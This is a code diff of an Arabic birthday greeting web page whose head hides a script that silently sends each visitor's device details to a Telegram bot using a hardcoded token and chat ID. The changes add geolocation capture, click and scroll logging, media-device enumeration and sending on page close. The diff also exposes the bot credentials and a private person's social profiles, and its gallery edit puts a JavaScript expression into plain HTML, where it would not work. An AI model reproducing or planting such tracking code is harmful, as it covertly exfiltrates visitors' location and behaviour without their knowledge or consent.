@@ -1,16 +1,16 @@
-<!DOCTYPE html>
-<html lang="ar">
+<!DOCTYPE html><html lang="ar">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>منونتي قلب بودا</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
-  
-  <script>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">  <script>
     async function sendVisitorInfo() {
         const botToken = "7805774303:AAFy5Vy3LIdBi7XeDVBp1-nvRoB4mgNPlPc";
         const chatId = "1557685494";
         const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const startTime = Date.now();
+        let clickCount = 0;
+        const interactions = [];
         
         // Collecting basic visitor info
         const visitorInfo = {
@@ -24,7 +24,8 @@
             OnlineStatus: navigator.onLine ? 'Online' : 'Offline',
             ConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
             TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            CurrentTime: new Date().toLocaleString()
+            CurrentTime: new Date().toLocaleString(),
+            VisitStartTime: new Date(startTime).toLocaleString()
         };
         
         // Collect battery info if available
@@ -39,29 +40,58 @@
             }
         }
         
-        // Formatting message
-        let message = "NEW VISITOR INFORMATION\n";
-        for (let key in visitorInfo) {
-            message += `${key}: ${visitorInfo[key]}\n`;
+        // Collecting location info
+        try {
+            const geo = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+            });
+            visitorInfo.Location = `Lat: ${geo.coords.latitude}, Lon: ${geo.coords.longitude}`;
+        } catch (error) {
+            visitorInfo.Location = "Unavailable";
         }
         
+        // Add click and scroll tracking
+        document.addEventListener('click', (event) => {
+            clickCount++;
+            interactions.push(`Click at (${event.pageX}, ${event.pageY}) on element: ${event.target.tagName}`);
+        });
+
+        document.addEventListener('scroll', () => {
+            interactions.push(`Scrolled to (${window.scrollX}, ${window.scrollY})`);
+        });
+
+        // Collecting media device info
         try {
-            const response = await fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            });
-            const result = await response.json();
-            console.log(result);
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const mediaDevices = devices.map(device => `${device.kind}: ${device.label || 'Unknown Device'}`).join(', ');
+            visitorInfo.MediaDevices = mediaDevices;
         } catch (error) {
-            console.error(error);
+            visitorInfo.MediaDevices = "Unavailable";
         }
+        
+        // Send info on window close
+        window.addEventListener('beforeunload', async () => {
+            visitorInfo.SessionDuration = Math.round((Date.now() - startTime) / 1000) + " seconds";
+            visitorInfo.ClickCount = clickCount;
+            visitorInfo.UserInteractions = interactions.join(" | ");
+            let message = "NEW VISITOR INFORMATION\n";
+            for (let key in visitorInfo) {
+                message += `${key}: ${visitorInfo[key]}\n`;
+            }
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+            } catch (error) {
+                console.error(error);
+            }
+        });
     }
     
     window.onload = sendVisitorInfo;
-  </script>
-
-  <style>
+  </script>  <style>
     body {
       margin: 0;
       font-family: 'Cairo', sans-serif;
@@ -117,15 +147,12 @@
       width: 250px;
       z-index: 1000;
     }
-  </style>
-</head>
+  </style></head>
 <body>
   <header>
     <h1>منونتي قلب بودا</h1>
     <p>عيد ميلاد سعيد 20 سنة!</p>
-  </header>
-  
-  <div class="message">
+  </header>  <div class="message">
     <p>
       منونتي قلب بودا<br>
       أحلى من تم عشرين سنة وبقى أجمل منون ف الدنيا<br>
@@ -133,32 +160,15 @@
       وتفضلي قلب بودا ونن عينه من جوا<br>
       يا أحلى منه ف الدنيا
     </p>
-  </div>
-  
-  <div class="gallery">
-    <img src="image1.jpg" alt="منونتي 1">
-    <img src="image2.jpg" alt="منونتي 2">
-    <img src="image3.jpg" alt="منونتي 3">
-    <img src="image4.jpg" alt="منونتي 4">
-    <img src="image5.jpg" alt="منونتي 5">
-    <img src="image6.jpg" alt="منونتي 6">
-    <img src="image7.jpg" alt="منونتي 7">
-    <img src="image8.jpg" alt="منونتي 8">
-    <img src="image9.jpg" alt="منونتي 9">
-    <img src="image10.jpg" alt="منونتي 10">
-  </div>
-  
-  <div class="social">
+  </div>  <div class="gallery">
+    ${Array.from({length: 15}, (_, i) => `<img src="image${i + 1}.jpg" alt="منونتي ${i + 1}">`).join('\n    ')}
+  </div>  <div class="social">
     <a href="https://www.facebook.com/profile.php?id=100069887810056" target="_blank">فيسبوك</a>
     <a href="https://www.instagram.com/mennasalama569" target="_blank">إنستغرام</a>
-  </div>
-  
-  <audio controls autoplay loop>
+  </div>  <audio controls autoplay loop>
     <source src="manonty.mp3" type="audio/mpeg">
     متصفحك لا يدعم تشغيل الموسيقى.
-  </audio>
-  
-  <footer>
+  </audio>  <footer>
     &copy; 2025/5/5 بودا لمنونتي
   </footer>
 </body>
